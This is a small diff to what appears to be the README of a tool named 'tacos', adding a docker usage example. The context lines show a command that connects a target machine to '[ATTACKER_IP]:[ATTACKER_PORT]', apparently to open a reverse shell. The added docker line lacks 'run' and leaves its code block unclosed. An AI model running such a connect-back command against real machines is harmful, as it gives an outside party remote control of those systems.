@@ -34,6 +34,10 @@ tmux
 ./tacos [ATTACKER_IP]:[ATTACKER_PORT]       # or .\tacos.exe [ATTACKER_IP]:[ATTACKER_PORT] for windows
 # 💥
 ```
+### With container
+
+```shell
+docker --net host --rm -it taco [LISTENING_IP] [LISTENING_PORT]
 
 ## Install
 
